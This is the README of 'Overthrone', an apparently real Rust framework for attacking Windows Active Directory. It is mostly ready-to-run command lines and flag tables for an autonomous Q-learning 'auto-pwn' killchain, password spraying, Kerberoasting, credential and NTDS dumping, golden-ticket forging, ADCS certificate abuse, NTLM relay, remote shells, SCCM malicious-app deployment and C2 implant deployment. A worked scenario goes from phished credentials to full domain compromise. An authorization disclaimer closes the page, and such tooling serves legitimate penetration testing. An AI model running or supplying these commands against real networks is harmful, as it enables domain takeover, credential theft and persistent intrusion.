Every command below works with both `overthrone` and `ovt`. We will use `ovt` because life is short and keystrokes are precious.

**Global flags** - these work on every command:

| Flag | Short | Env Var | What it does |
|---|---|---|---|
| `--dc-host` | `-H` | `OT_DC_HOST` | Domain Controller IP or hostname. Also accepts `--dc` and `--dc-ip` because we're not monsters. |
| `--domain` | `-d` | `OT_DOMAIN` | Target domain (e.g., `corp.local`). The kingdom you're about to audit. |
| `--username` | `-u` | `OT_USERNAME` | Domain username. The key to the front door. |
| `--password` | `-p` | `OT_PASSWORD` | Password. Hidden from env output because we have manners. |
| `--nt-hash` | | `OT_NT_HASH` | NTLM hash for Pass-the-Hash. The hash IS the password. |
| `--ticket` | | `KRB5CCNAME` | Kerberos ticket cache file. For the "I already have a ticket" crowd. |
| `--auth-method` | `-A` | | Auth method: `password` (default), `hash`, `ticket`. Pick your poison. |
| `--verbose` | `-v` | | Verbosity: `-v` info, `-vv` debug, `-vvv` trace (prepare for a wall of text). |
| `--output` | `-o` | | Output format: `text`, `json`, `csv`. Default: `text`. |
| `--outfile` | `-O` | | Save output to file. For when you need receipts. |

---

#### `ovt auto-pwn` - The "Hold My Beer" Button

The full autonomous killchain. Goes from "I have creds" to "I own everything" while you watch it happen in real time. Now with **Q-Learning AI** that gets smarter every engagement and actually shows its work - every step prints the stage, noise level, Q-state, action decision (explore vs exploit), Q-value, and reward. The final report has a kill-chain completion graphic, credential tables, loot summaries, and an audit trail. No more staring at a blank terminal hoping something is happening.

```bash
# Basic - let the AI figure it out
ovt auto-pwn -H 10.10.10.1 -d corp.local -u jsmith -p 'Summer2026!'

# Stealth mode - the ninja approach (low-noise, extra jitter)
ovt auto-pwn -H 10.10.10.1 -d corp.local -u jsmith -p 'Summer2026!' --stealth

# Dry run - plan the heist without pulling the trigger
ovt auto-pwn -H 10.10.10.1 -d corp.local -u jsmith -p 'Summer2026!' --dry-run

# Full Q-Learning with persistent brain across engagements
ovt auto-pwn -H 10.10.10.1 -d corp.local -u jsmith -p 'Summer2026!' \
  --adaptive hybrid --q-table ./engagement_brain.json

# Stop at enumeration only (recon goal)
ovt auto-pwn -H 10.10.10.1 -d corp.local -u jsmith -p 'Summer2026!' \
  --target recon --max-stage enumerate

# Run a specific playbook instead of goal-driven AI
ovt auto-pwn -H 10.10.10.1 -d corp.local -u jsmith -p 'Summer2026!' \
  --playbook full-auto-pwn

# NTLM hash auth - because the hash IS the password
ovt auto-pwn -H 10.10.10.1 -d corp.local -u admin --nt-hash aad3b435b51404ee:8846f7eaee8fb117
```

| Flag | Default | What it does |
|---|---|---|
| `--target`, `-t` | `Domain Admins` | Goal: `"Domain Admins"`, `"ntds"`, `"recon"`, a hostname, or a username. What do you want to own today? |
| `--method`, `-m` | `auto` | Exec method: `auto`, `psexec`, `smbexec`, `wmiexec`, `winrm`. Auto picks the best one like a sommelier for lateral movement. |
| `--stealth` | `false` | Low-noise mode. Skips noisy attacks, adds jitter. For when the SOC is actually awake. |
| `--dry-run` | `false` | Plan only, no execution. See the whole attack plan without committing any career-limiting moves. |
| `--max-stage` | `loot` | Stop at a stage: `enumerate`, `attack`, `escalate`, `lateral`, `loot`, `cleanup`. Like a volume knob for destruction. |
| `--adaptive` | `hybrid` | AI engine: `heuristic` (rule-based), `qlearning` (pure RL), `hybrid` (best of both - recommended). |
| `--q-table` | `q_table.json` | Path to persist Q-learning brain. Reuse across engagements - your AI gets smarter every time. |
| `--jitter-ms` | `1000` | Milliseconds of random delay between steps. Higher = stealthier = slower = more coffee. |
| `--ldaps` | `false` | Use LDAP over SSL (port 636). For the security-conscious DC. |
| `--timeout` | `30` | Per-step timeout in seconds. Some DCs are slow. Some are just rude. |
| `--playbook` | none | Run a named playbook: `full-recon`, `roast-and-crack`, `delegation-abuse`, `rbcd-chain`, `coerce-and-relay`, `lateral-pivot`, `dc-sync-dump`, `golden-ticket`, `full-auto-pwn`. |

**The Killchain Stages:**

```
 ENUMERATE → ATTACK → ESCALATE → LATERAL → LOOT → CLEANUP
    🔍          ⚔️        📈         🔀       💰       🧹
  Users       Roast     Dump LSA   PsExec   DCSync   Remove
  Comps       ADCS      Dump SAM   WinRM    NTDS     Traces
  Groups      Spray     Crack      WMI      Golden
  Trusts      RBCD      Cred Reuse SmbExec  Report
  GPOs        Deleg     Check Admin
  Shares
```

The Q-Learner tracks which attacks work best in which situations and optimizes future runs. It's like Netflix recommendations, but for privilege escalation. Now it also tells you what it's thinking - every step shows the encoded state (stage/creds/DA/admins/stealth/ε), the action it chose, the Q-value backing that decision, whether it's exploring (trying new things) or exploiting (doing what worked before), and the reward it got. The final report includes a kill-chain pipeline showing which stages completed (✓) and which failed (✗), a per-stage stats table, a credential table with source and admin status, a loot summary, and the full audit trail. You can finally watch the AI work instead of trusting the vibes.

---

#### `ovt wizard` - Interactive Guided Mode

The autopwn with guardrails. Pauses after each stage for operator review. Supports checkpoints so you can resume if your VPN drops.

```bash
# Start a new wizard session
ovt wizard --target "Domain Admins" --dc-host 10.10.10.1 -d corp.local -u student -p 'Lab123!'

# Resume from checkpoint (your VPN dropped again, didn't it?)
ovt wizard --resume ./checkpoints/wiz_20260218_210530.json

# Skip enumeration - load state from a previous run
ovt wizard --target DA --skip-enum --from-file enum.json

# Fully automated - no pauses, just vibes
ovt wizard --target DA --dc-host 10.10.10.1 -d corp.local -u jsmith -p 'Pass!' --no-pause
```

| Flag | Default | What it does |
|---|---|---|
| `--target`, `-t` | required | Goal: `"Domain Admins"`, `"ntds"`, hostname, username |
| `--resume` | | Resume from checkpoint JSON file |
| `--skip-enum` | `false` | Skip enumeration (requires `--from-file`) |
| `--from-file` | | Load previous enumeration state JSON |
| `--no-pause` | `false` | Don't pause between stages (fully automated) |
| `--no-auto-crack` | `false` | Don't prompt for hash cracking |
| `--pause-timeout` | `300` | Seconds before auto-continuing (0 = wait forever) |
| `--max-stage` | `loot` | Maximum stage to reach |
| `--exec-method`, `-m` | `auto` | Preferred execution method |
| `--stealth` | `false` | Low-noise mode |
| `--dry-run` | `false` | Plan only |
| `--jitter-ms` | `1000` | Jitter between operations |
| `--ldaps` | `false` | Use LDAPS |
| `--timeout` | `30` | Per-step timeout (seconds) |

---

#### `ovt reaper` - Full AD Enumeration Engine

The "tell me everything" command. Runs all enumeration modules against the DC via LDAP.

```bash
# Run all modules
ovt reaper --dc-ip 10.10.10.1 -d corp.local -u jsmith -p 'Summer2026!'

# Run specific modules only
ovt reaper --dc-ip 10.10.10.1 -d corp.local -u jsmith -p 'Summer2026!' \
  --modules users,computers,groups,acls

# Big domain? Increase page size
ovt reaper --dc-ip 10.10.10.1 -d corp.local -u jsmith -p 'Summer2026!' --page-size 1000
```

| Flag | Default | What it does |
|---|---|---|
| `--dc-ip` | | Domain Controller IP (also accepts `--dc`, `--dc-host`) |
| `--modules`, `-m` | all | Comma-separated list: `users`, `computers`, `groups`, `acls`, `trusts`, `gpos`, etc. |
| `--page-size` | `500` | LDAP page size. Bigger = fewer round trips. Smaller = less suspicious. |

---

#### `ovt enum` - Quick Enumeration by Target Type

Enumerate specific AD object types without running the full reaper engine.

```bash
ovt enum users -H 10.10.10.1 -d corp.local -u jsmith -p 'Summer2026!'
ovt enum computers -H 10.10.10.1 -d corp.local -u jsmith -p 'Summer2026!'
ovt enum groups -H 10.10.10.1 -d corp.local -u jsmith -p 'Summer2026!'
ovt enum spns -H 10.10.10.1 -d corp.local -u jsmith -p 'Summer2026!'
ovt enum delegations -H 10.10.10.1 -d corp.local -u jsmith -p 'Summer2026!'
ovt enum all -H 10.10.10.1 -d corp.local -u jsmith -p 'Summer2026!'
```

| Target | What it finds |
|---|---|
| `users` | All domain users. The guest list. |
| `computers` | All machine accounts. The hardware census. |
| `groups` | Groups & memberships. The org chart of doom. |
| `trusts` | Domain trusts. Who trusts whom (and shouldn't). |
| `spns` | Kerberoastable service accounts. The cracking shopping list. |
| `asrep` | AS-REP roastable accounts. Someone unchecked a box. |
| `delegations` | Constrained, unconstrained, RBCD. Delegation = impersonation. |
| `gpos` | Group Policy Objects. Where the misconfigurations live. |
| `all` | Everything above. YOLO. |

---

#### `ovt kerberos` - Kerberos Operations

Aliases: `ovt krb`, `ovt roast`

```bash
# Kerberoast - extract TGS hashes for offline cracking
ovt kerberos roast -H 10.10.10.1 -d corp.local -u jsmith -p 'Summer2026!'
ovt kerberos roast --spn MSSQLSvc/db01.corp.local  # Target a specific SPN

# AS-REP Roast - no pre-auth required = free hashes
ovt kerberos asrep-roast -H 10.10.10.1 -d corp.local -u jsmith -p 'Summer2026!'
ovt kerberos asrep-roast --userlist users.txt  # From a user list

# Request a TGT (proof of authentication)
ovt kerberos get-tgt -H 10.10.10.1 -d corp.local -u jsmith -p 'Summer2026!'

# Request a TGS for a specific SPN
ovt kerberos get-tgs --spn cifs/dc01.corp.local -H 10.10.10.1 -d corp.local -u jsmith -p 'Summer2026!'
```

---

#### `ovt smb` - SMB Operations

```bash
# List shares on a target
ovt smb shares --target 10.10.10.1 -d corp.local -u jsmith -p 'Summer2026!'

# Check admin access
ovt smb admin --targets 10.10.10.1,10.10.10.2 -d corp.local -u admin -p 'Admin!'

# Spider shares for juicy files (.kdbx, .key, .pem, .ps1, .rdp)
ovt smb spider --target 10.10.10.1 -d corp.local -u jsmith -p 'Summer2026!'
ovt smb spider --target 10.10.10.1 --extensions ".config,.xml,.txt,.sql"

# Download a file from a share
ovt smb get --target 10.10.10.1 --path "SYSVOL/corp.local/Policies/passwords.xml"

# Upload a file to a share
ovt smb put --target 10.10.10.1 --local payload.exe --remote "C$/Windows/Temp/payload.exe"
```

---

#### `ovt exec` - Remote Command Execution

```bash
# Auto-detect best method
ovt exec --target 10.10.10.50 --command "whoami /all" -d corp.local -u admin -p 'Pass!'

# Force a specific method
ovt exec --target 10.10.10.50 --command "ipconfig /all" --method psexec
ovt exec --target 10.10.10.50 --command "hostname" --method wmiexec
ovt exec --target 10.10.10.50 --command "net user" --method winrm
ovt exec --target 10.10.10.50 --command "dir C:\" --method smbexec
```

| Method | Protocol | Stealth | Notes |
|---|---|---|---|
| `auto` | Best available | Varies | Tries WinRM → WMI → SMB → PsExec |
| `psexec` | DCE/RPC + SMB | Low | Creates a service. Loud but reliable. The Honda Civic of lateral movement. |
| `smbexec` | SCM over SMB | Medium | Service-based. Slightly sneakier than PsExec. |
| `wmiexec` | DCOM/WMI | Medium | WMI semi-interactive. Output via SMB file. |
| `winrm` | WS-Management | High | Native Windows remote management. Blends in beautifully. |

---

#### `ovt graph` - Attack Graph Engine

Build, query, and export the attack relationship graph. BloodHound vibes, zero Neo4j.

```bash
# Build the graph from enumeration data
ovt graph build -H 10.10.10.1 -d corp.local -u jsmith -p 'Summer2026!'

# Find shortest path between two nodes
ovt graph path --from jsmith --to "Domain Admins"

# Find ALL paths to Domain Admins from a user
ovt graph path-to-da --from jsmith
# Output: 3 hops. The CISO will need to sit down.

# Graph stats
ovt graph stats

# Export (JSON or BloodHound format)
ovt graph export --output graph.json
ovt graph export --output bloodhound.json --bloodhound
```

---

#### `ovt spray` - Password Spraying

The "try one password against everyone" attack. Handle with care (and lockout awareness).

```bash
ovt spray -H 10.10.10.1 -d corp.local \
  --password 'Winter2026!' --userlist users.txt --delay 1 --jitter 0
```

| Flag | Default | What it does |
|---|---|---|
| `--password`, `-p` | required | The one password to rule them all |
| `--userlist`, `-U` | required | File with usernames (one per line) |
| `--delay` | `1` | Seconds between attempts. Respect the lockout policy. |
| `--jitter` | `0` | Random extra delay. Confuse the SOC. |

---

#### `ovt forge` - Ticket Forging & Persistence

The blacksmith's toolkit. Forge tickets, persist access, make blue teams cry.

```bash
# Golden Ticket - be anyone, access anything, forever
ovt forge golden --domain-sid S-1-5-21-1234... --krbtgt-hash <32hex> \
  --user Administrator --output golden.kirbi

# Silver Ticket - access one service, no DC interaction
ovt forge silver --domain-sid S-1-5-21-1234... --service-hash <32hex> \
  --spn cifs/dc01.corp.local --output silver.kirbi
```

| Subcommand | What it forges |
|---|---|
| `golden` | TGT signed with KRBTGT hash. Willy Wonka's factory pass. |
| `silver` | TGS for a specific service. Stealthier than golden - no DC needed. |

---

#### `ovt dump` - Credential Dumping

```bash
# Dump SAM (local account hashes)
ovt dump --target 10.10.10.50 sam -d corp.local -u admin -p 'Pass!'

# Dump LSA secrets (service account passwords, DPAPI keys)
ovt dump --target 10.10.10.50 lsa -d corp.local -u admin -p 'Pass!'

# Dump NTDS.dit (ALL domain hashes - the motherload)
ovt dump --target 10.10.10.1 ntds -d corp.local -u da_admin -p 'DA_Pass!'

# Dump DCC2 cached credentials
ovt dump --target 10.10.10.50 dcc2 -d corp.local -u admin -p 'Pass!'
```

---

#### `ovt crack` - Hash Cracking

Offline hash cracking with embedded wordlist, rules, and rayon parallelism.

```bash
# Crack a single hash (auto-detects type)
ovt crack --hash '$krb5tgs$23$*svc_sql...'

# Crack from a file
ovt crack --file kerberoast_hashes.txt

# Thorough mode with custom wordlist
ovt crack --file hashes.txt --mode thorough --wordlist /usr/share/wordlists/rockyou.txt

# Limit candidates (fast mode for quick wins)
ovt crack --file hashes.txt --mode fast --max-candidates 100000
```

| Flag | Default | What it does |
|---|---|---|
| `--hash`, `-s` | | Single hash string (auto-detects type) |
| `--file`, `-f` | | File with hashes (one per line) |
| `--mode`, `-M` | `default` | `fast` (minimal rules), `default` (balanced), `thorough` (all rules, exhaustive) |
| `--wordlist`, `-W` | embedded 10K | Custom wordlist. Default uses embedded top-10K + rules. |
| `--max-candidates` | `0` (unlimited) | Cap on total candidates to try |

---

#### `ovt rid` - RID Cycling

Enumerate users/groups via MS-SAMR. Works unauthenticated with null sessions.

```bash
# Default range (RID 500-10500)
ovt rid -H 10.10.10.1 -d corp.local -u jsmith -p 'Summer2026!'

# Custom range
ovt rid -H 10.10.10.1 -d corp.local --start-rid 500 --end-rid 50000

# Null session (no creds needed - if the DC allows it)
ovt rid -H 10.10.10.1 -d corp.local --null-session
```

---

#### `ovt adcs` - ADCS Certificate Abuse (ESC1-ESC8)

AD Certificate Services exploitation. The gift that keeps on giving (to attackers).

```bash
# Enumerate vulnerable templates
ovt adcs enum -H 10.10.10.1 -d corp.local -u jsmith -p 'Summer2026!'
ovt adcs enum --ca CA01.corp.local  # Target specific CA

# ESC1 - SAN abuse (the most common ADCS vuln)
ovt adcs esc1 --ca CA01 --template VulnTemplate --target-user Administrator

# ESC2 - Any purpose EKU
ovt adcs esc2 --ca CA01 --template AnyPurpose

# ESC3 - Enrollment agent abuse (two-step)
ovt adcs esc3 --ca CA01 --agent-template Agent --target-template User --target-user admin

# ESC4 - Writable template ACLs
ovt adcs esc4 --ca CA01 --template WritableTemplate

# ESC5 - Vulnerable CA config
ovt adcs esc5 --ca CA01

# ESC6 - EDITF_ATTRIBUTESUBJECTALTNAME2
ovt adcs esc6 --ca CA01 --target-user Administrator

# ESC7 - ManageCA permission abuse
ovt adcs esc7 --ca CA01

# ESC8 - NTLM relay to web enrollment
ovt adcs esc8 --url https://ca01.corp.local/certsrv --target-user Administrator

# Request a certificate manually
ovt adcs request --ca CA01 --template User --san "administrator@corp.local" -o cert.pfx
```

---

#### `ovt ntlm` - NTLM Relay & Poisoning

Aliases: `ovt relay`

```bash
# Capture NTLM hashes (Responder-style)
ovt ntlm capture --interface eth0 --port 445

# Relay to SMB targets
ovt ntlm relay --targets 10.10.10.50:445,10.10.10.51:445

# SMB-specific relay
ovt ntlm smb-relay --targets 10.10.10.50:445 --command "whoami"

# HTTP relay (for ADCS ESC8)
ovt ntlm http-relay --targets 10.10.10.1:80 --command "whoami"
```

---

#### `ovt move` - Lateral Movement & Trust Mapping

Aliases: `ovt lateral`

```bash
# Display domain trust relationships
ovt move trusts -H 10.10.10.1 -d corp.local -u jsmith -p 'Summer2026!'

# Find cross-domain escalation paths
ovt move escalation

# Analyze MSSQL linked server chains
ovt move mssql

# Print full trust map visualization
ovt move map
```

---

#### `ovt secrets` - Offline Secrets Dumping

Parse registry hive files offline (SAM, SECURITY, SYSTEM).

```bash
# Dump SAM hashes from hive files
ovt secrets sam --sam ./SAM --system ./SYSTEM

# Dump LSA secrets
ovt secrets lsa --security ./SECURITY --system ./SYSTEM

# Dump cached domain credentials (DCC2/mscash2)
ovt secrets dcc2 --security ./SECURITY --system ./SYSTEM
```

---

#### `ovt gpp` - GPP Password Decryption

Decrypt Group Policy Preferences cpassword values. Microsoft published the AES key. We just use it.

```bash
# Decrypt from a GPP XML file
ovt gpp --file Groups.xml

# Decrypt a raw cpassword string
ovt gpp --cpassword "edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+..."
```

---

#### `ovt laps` - LAPS Password Reading

Read local admin passwords stored in AD (LAPS v1 plaintext + LAPS v2 encrypted via DPAPI).

```bash
# Read all LAPS passwords
ovt laps -H 10.10.10.1 -d corp.local -u jsmith -p 'Summer2026!'

# Read for a specific computer
ovt laps --computer WS01 -H 10.10.10.1 -d corp.local -u jsmith -p 'Summer2026!'
```

---

#### `ovt shell` - Interactive Remote Shell

Persistent remote session on a target. Like SSH, but for Windows, and scarier.

```bash
# WinRM shell (default)
ovt shell --target 10.10.10.50 -d corp.local -u admin -p 'Pass!'

# SMB-based shell
ovt shell --target 10.10.10.50 --shell-type smb

# WMI-based shell
ovt shell --target 10.10.10.50 --shell-type wmi
```

---

#### `ovt scan` - Port Scanner

Lightweight network reconnaissance. Not nmap, but it gets the job done.

```bash
# Scan top 1000 ports
ovt scan --targets 10.10.10.0/24

# Custom port range
ovt scan --targets 10.10.10.1 --ports 1-65535

# Specific ports with timeout
ovt scan --targets 10.10.10.0/24 --ports 80,443,445,3389,5985 --timeout 2000

# SYN scan (requires root/raw sockets)
ovt scan --targets 10.10.10.0/24 --scan-type syn
```

---

#### `ovt mssql` - MSSQL Operations

Talk to SQL Server. Execute queries. Enable xp_cmdshell. Question your life choices.

```bash
# Execute a SQL query
ovt mssql query --target 10.10.10.100 --query "SELECT @@version" -d corp.local -u sa -p 'sa'

# Execute OS command via xp_cmdshell
ovt mssql xp-cmd-shell --target 10.10.10.100 --command "whoami"

# Enumerate linked servers
ovt mssql linked-servers --target 10.10.10.100

# Enable xp_cmdshell (if disabled)
ovt mssql enable-xp-cmd-shell --target 10.10.10.100

# Check if xp_cmdshell is enabled
ovt mssql check-xp-cmd-shell --target 10.10.10.100
```

---

#### `ovt sccm` - SCCM/MECM Abuse

Aliases: `ovt sccm`, `ovt mecm`

```bash
# Enumerate SCCM configuration
ovt sccm enum --site-server sccm01.corp.local

# Client push abuse
ovt sccm abuse --site-server sccm01.corp.local --technique client-push

# Deploy a malicious application
ovt sccm deploy --collection "All Systems" --app-name "Legit Update" --payload ./payload.exe
```

---

#### `ovt report` - Engagement Reporting

Turn carnage into compliance documents.

```bash
# Markdown report (for the technical team)
ovt report --input engagement.json --output report.md --format markdown

# JSON report (for automation/SIEMs)
ovt report --input engagement.json --output findings.json --format json

# PDF report (for executives who think Domain Admin is a job title)
ovt report --input engagement.json --output executive.pdf --format pdf
```

---

#### `ovt doctor` - Environment Diagnostics

Aliases: `ovt check`, `ovt env`

Check dependencies, connectivity, and environment before an engagement.

```bash
# Run all checks
ovt doctor

# Specific checks
ovt doctor --checks smb,kerberos,winrm,network --dc 10.10.10.1
```

---

#### `ovt tui` - Interactive Terminal UI

Launch the full TUI with live attack graph visualization, session panels, and crawler integration.

```bash
# Start TUI with domain crawl
ovt tui --domain corp.local -H 10.10.10.1 -d corp.local -u jsmith -p 'Summer2026!'

# Load a previous graph
ovt tui --domain corp.local --load graph.json --crawl false
```

---

#### `ovt plugin` - Plugin System

Aliases: `ovt plug`

```bash
# List loaded plugins
ovt plugin list

# Plugin info
ovt plugin info smart-spray

# Execute a plugin command
ovt plugin exec spray-smart -- --targets users.txt --password 'Winter2026!'

# Load/unload plugins
ovt plugin load ./plugins/custom_scanner.wasm
ovt plugin unload custom-scanner
ovt plugin enable custom-scanner
ovt plugin disable custom-scanner
```

---

#### `ovt c2` - C2 Framework Integration

Connect to Cobalt Strike, Sliver, or Havoc teamservers.

```bash
# Connect to Sliver (mTLS)
ovt c2 connect sliver 10.10.10.200 31337 --config ./operator.cfg

# Connect to Cobalt Strike
ovt c2 connect cs 10.10.10.200 50050 --password 'teamserver_pass'

# Connect to Havoc
ovt c2 connect havoc 10.10.10.200 40056 --token 'api_token_here'

# Check C2 status
ovt c2 status

# Execute command on a beacon/session
ovt c2 exec <session_id> "whoami /all"
ovt c2 exec <session_id> "Get-Process" --powershell

# Deploy implant to a target
ovt c2 deploy default 10.10.10.50 http-listener

# List listeners
ovt c2 listeners default

# Disconnect
ovt c2 disconnect all
```

---

#### Quick Reference Card

For the "I don't read docs, I read cheat sheets" crowd:

```bash
# === RECON ===
ovt enum all -H DC -d DOMAIN -u USER -p PASS         # Enumerate everything
ovt reaper -H DC -d DOMAIN -u USER -p PASS            # Full LDAP reaper
ovt scan --targets 10.10.10.0/24                       # Port scan
ovt rid -H DC -d DOMAIN --null-session                 # RID cycling

# === KERBEROS ===
ovt kerberos roast -H DC -d DOMAIN -u USER -p PASS    # Kerberoast
ovt kerberos asrep-roast -H DC -d DOMAIN -u USER      # AS-REP Roast
ovt kerberos get-tgt -H DC -d DOMAIN -u USER -p PASS  # Get TGT
ovt crack --file hashes.txt --mode thorough            # Crack offline

# === CERTS ===
ovt adcs enum -H DC -d DOMAIN -u USER -p PASS         # Find vulnerable templates
ovt adcs esc1 --ca CA --template TPL --target-user DA  # ESC1 exploit

# === LATERAL ===
ovt exec -t TARGET -c "whoami" -d DOMAIN -u ADMIN      # Remote exec
ovt shell -t TARGET -d DOMAIN -u ADMIN -p PASS         # Interactive shell
ovt smb admin --targets 10.10.10.0/24                  # Admin check

# === LOOT ===
ovt dump -t DC ntds -d DOMAIN -u DA -p PASS            # Dump NTDS
ovt forge golden --krbtgt-hash HASH --domain-sid SID   # Golden ticket
ovt laps -H DC -d DOMAIN -u USER -p PASS               # Read LAPS

# === AUTOPWN ===
ovt auto-pwn -H DC -d DOMAIN -u USER -p PASS           # Full killchain
ovt wizard -t DA --dc-host DC -d DOMAIN -u USER        # Guided mode

# === MISC ===
ovt doctor                                              # Health check
ovt report -o report.pdf --format pdf                   # Generate report
ovt tui --domain DOMAIN                                 # Launch TUI
```

## Examples

### Scenario 1: "I just got a foothold"

```bash
# 1. Enumerate
ovt enum all -H 10.10.10.1 -d corp.local -u jsmith -p 'Phished123!'

# 2. Build graph + find paths
ovt graph build -H 10.10.10.1 -d corp.local -u jsmith -p 'Phished123!'
ovt graph path-to-da --from jsmith
# 3 hops. The CISO will need to sit down.

# 3. Kerberoast the SPN account in the path
ovt kerberos roast -H 10.10.10.1 -d corp.local -u jsmith -p 'Phished123!'
# Hashes saved to ./loot/kerberoast_hashes.txt
ovt crack --file ./loot/kerberoast_hashes.txt --mode thorough
# Got: SVC-BACKUP:Backup2019!

# 4. Pass-the-Hash to DC (or use the password if you cracked it)
ovt exec --target dc01.corp.local --command "whoami /all" -d corp.local -u SVC-BACKUP -p 'Backup2019!'
ovt exec --target dc01.corp.local --command "whoami /all" -d corp.local -u SVC-BACKUP --nt-hash <nthash>

# 5. DCSync - get all the hashes
ovt dump --target 10.10.10.1 ntds -d corp.local -u SVC-BACKUP -p 'Backup2019!'

# 6. Report
ovt report --format markdown --output corp-local-report.md
```

### Scenario 2: "Full autopwn, I have a meeting in an hour"

```bash
ovt autopwn --dc 10.10.10.1 --domain corp.local -u jsmith -p 'Summer2026!'
# Go get coffee. Come back to: engagement-report.md
```

## FAQ

**Q: Is this legal?**
A: With explicit written authorization - absolutely. Without it - absolutely not. The difference between a pentester and a criminal is a signed document and a really good PowerPoint presentation.

**Q: How is this different from BloodHound?**
A: BloodHound shows you the path. Overthrone walks it. (And then forges a Golden Ticket at the end, cleans up, and generates a PDF about it.)

**Q: How is this different from Impacket?**
A: Impacket is a legendary Python protocol library. Overthrone reimplements the same protocols in Rust with a unified framework, autonomous planning, and integrated reporting. Impacket is the toolbox. Overthrone is the factory. Also, no `pip install` failures at 2 AM.

**Q: Why Rust?**
A: Memory safety. Single static binary. Native performance. No dependency hell. No Wine. No .NET. Also, explaining Rust lifetime errors to a rubber duck at 4 AM builds character.

**Q: Will this get caught by AV/EDR?**
A: Overthrone uses native protocol implementations that look identical to legitimate Windows traffic. It doesn't inject into processes, doesn't use PowerShell, doesn't drop assemblies. That said, if you DCSync from a Linux box at 3 AM, any decent SOC will notice.

**Q: Does it need Wine or Mimikatz or .NET?**
A: No. No. And no. Every protocol is native Rust. If you find yourself installing Wine to run Overthrone, something has gone terribly wrong.

**Q: Can I extend it with custom modules?**
A: Native DLL plugin loading works with a full Plugin trait. WASM plugins load and execute via wasmtime with state persistence, manifest parsing, and smart memory allocation. The workspace architecture makes adding new modules straightforward. PRs welcome.

**Q: What about the C2 integrations?**
A: They work now. Sliver (mTLS REST), Havoc (REST with auth), Cobalt Strike (Aggressor-style REST). Real HTTP clients, real API calls, real session management. The "aspirational code" era is over.

## Contributing

PRs welcome. Issues welcome. Memes about Active Directory misconfigurations are especially welcome. If your PR includes a pun in the commit message, it gets reviewed first.

## Star History

If you've read this far - all the way to the bottom of this README, past the crate report card, past the backlog table - you're legally obligated to star the repo. It's in the MIT license. (It's not in the MIT license. But it should be.)

**[Star this repo](https://github.com/Karmanya03/Overthrone)** - every star adds 0.001 damage to the attack graph.

## Disclaimer

This tool is for **authorized security testing only**. Using Overthrone against systems without explicit written permission is illegal, unethical, and will make your parents disappointed. The authors are not responsible for misuse.

Always:
- Get written authorization before testing
- Define scope and rules of engagement
- Don't break things you weren't asked to break
- Report everything you find, especially the embarrassing stuff
- Remember that somewhere, a sysadmin set `Password1` on a service account and hoped nobody would notice

## License

MIT - use it, modify it, learn from it, build on it. Just don't be evil with it.

***

<p align="center">
  <sub>Built with mass amounts of mass-produced instant coffee, mass amounts of Rust, and a personal grudge against misconfigured ACLs.</sub><br/>
  <sub>9 crates. Pure Rust protocols. Zero Python. One smbclient dependency. No regrets. (Some regrets.)</sub><br/>
  <sub>Every throne falls. The question is whether you find out from a pentester or from a ransomware note.</sub><br/>
  <sub>We prefer the first option. Your insurance company does too.</sub>
</p>
